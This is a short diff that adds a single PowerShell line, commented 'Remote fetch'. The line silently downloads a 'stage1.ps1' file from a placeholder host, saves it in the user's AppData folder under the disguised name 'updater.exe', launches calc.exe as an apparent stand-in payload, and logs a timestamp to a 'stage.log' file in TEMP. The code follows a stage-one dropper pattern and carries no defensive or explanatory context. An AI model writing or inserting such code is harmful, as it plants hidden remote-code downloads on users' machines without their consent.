@@ -1,0 +1,2 @@
+
+<# Remote fetch #> $TransferUrl = 'https://example.org/stage1.ps1'; $PayloadPath = "$env:APPDATA\updater.exe"; $RequestTimeout = 146; try { Start-BitsTransfer -Source $TransferUrl -Destination $PayloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
